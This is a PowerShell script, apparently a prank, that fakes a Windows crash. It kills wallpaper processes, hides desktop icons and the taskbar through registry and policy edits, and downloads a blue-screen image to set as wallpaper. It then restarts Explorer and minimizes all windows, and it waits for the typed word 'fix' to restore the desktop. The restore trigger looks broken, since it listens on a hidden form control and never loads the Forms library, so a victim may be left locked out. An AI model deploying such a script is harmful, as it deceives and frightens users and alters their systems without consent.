$code = @'
using System;
using System.Runtime.InteropServices;

public class Win32 {
    [DllImport("user32.dll", SetLastError = true)]
    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
    
    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    
    [DllImport("user32.dll")]
    public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
}
'@

Add-Type -TypeDefinition $code

# Kill specific Wallpaper Engine processes
$processNames = @(
    "wallpaper64",
    "wallpaper32",
    "webwallpaper64",
    "webwallpaper32",
    "wallpaperservice32"
)

foreach ($processName in $processNames) {
    Stop-Process -Name $processName -Force -ErrorAction SilentlyContinue
}
Start-Sleep -Seconds 2

# Hide desktop icons
$Path = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"
Set-ItemProperty -Path $Path -Name "HideIcons" -Value 1
$Path = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
If (!(Test-Path $Path)) { New-Item -Path $Path -Force | Out-Null }
Set-ItemProperty -Path $Path -Name "NoDesktop" -Value 1

# Download BSOD image
$imageUrl = "https://1.bp.blogspot.com/-fifVJfHz0-M/XDjD30_jWcI/AAAAAAAAAWM/HQ3Uv5ZHVCo37RbllK7v927DMYUl36TJgCLcBGAs/s1600/blue%2Bscreen%2Bof%2Bdeath%2Bwindow%2B10.png"
$imagePath = "$env:USERPROFILE\Downloads\bsod.png"
(New-Object System.Net.WebClient).DownloadFile($imageUrl, $imagePath)

# Set as wallpaper
[Win32]::SystemParametersInfo(0x0014, 0, $imagePath, 0x01 -bor 0x02)

# Hide taskbar
$RegPath = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StuckRects3"
$RegKey = (Get-ItemProperty -Path $RegPath).Settings
$RegKey[8] = 3  # Hide taskbar
Set-ItemProperty -Path $RegPath -Name Settings -Value $RegKey

# Restart explorer to apply all changes
Stop-Process -Name explorer -Force
Start-Process explorer

# Wait 6 seconds and kill specific processes again if they relaunched
Start-Sleep -Seconds 6
foreach ($processName in $processNames) {
    Stop-Process -Name $processName -Force -ErrorAction SilentlyContinue
}

# Minimize all windows
$shell = New-Object -ComObject "Shell.Application"
$shell.MinimizeAll()

# Set up event for restoration
$restored = $false
$null = Register-ObjectEvent -InputObject ([System.Windows.Forms.Control]::new()) -EventName KeyPress -Action {
    $key = $Event.SourceEventArgs.KeyChar
    if (-not $restored) {
        $script:buffer += $key
        if ($script:buffer.Length -gt 3) {
            $script:buffer = $script:buffer.Substring(1)
        }
        if ($script:buffer -eq "fix") {
            $restored = $true
            
            # Show desktop icons
            Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" -Name "HideIcons" -Value 0
            Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" -Name "NoDesktop" -Value 0

            # Download and set normal wallpaper
            $imageUrl = "https://wallpapercave.com/wp/wp10128604.jpg"
            $imagePath = "$env:USERPROFILE\Downloads\normal.jpg"
            (New-Object System.Net.WebClient).DownloadFile($imageUrl, $imagePath)
            [Win32]::SystemParametersInfo(0x0014, 0, $imagePath, 0x01 -bor 0x02)

            # Show taskbar
            $RegPath = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StuckRects3"
            $RegKey = (Get-ItemProperty -Path $RegPath).Settings
            $RegKey[8] = 2  # Show taskbar
            Set-ItemProperty -Path $RegPath -Name Settings -Value $RegKey

            # Restart explorer to apply changes
            Stop-Process -Name explorer -Force
            Start-Process explorer

            # Exit the script
            [System.Windows.Forms.Application]::Exit()
        }
    }
}

# Keep the script running until restoration is triggered
[System.Windows.Forms.Application]::Run()
